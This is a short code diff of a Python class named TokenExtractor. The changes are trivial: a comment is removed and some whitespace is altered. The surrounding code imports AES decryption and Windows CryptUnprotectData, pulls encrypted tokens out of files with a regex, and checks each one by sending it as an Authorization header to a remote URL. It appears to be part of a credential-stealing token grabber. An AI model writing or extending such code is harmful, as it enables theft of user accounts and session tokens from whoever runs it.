@@ -4,7 +4,7 @@ import os
 import re
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
-import requests  # Importando o módulo requests
+import requests  
 
 class TokenExtractor:
     def __init__(self):
@@ -47,7 +47,7 @@ class TokenExtractor:
                         for token in re.findall(self.regexp_enc, line):
                             if self.validate_token(token):
                                 self.tokens.append(token)
-
+        
     def validate_token(self, token):
         response = requests.get(self.base_url, headers={'Authorization': token})
         return response.status_code == 200
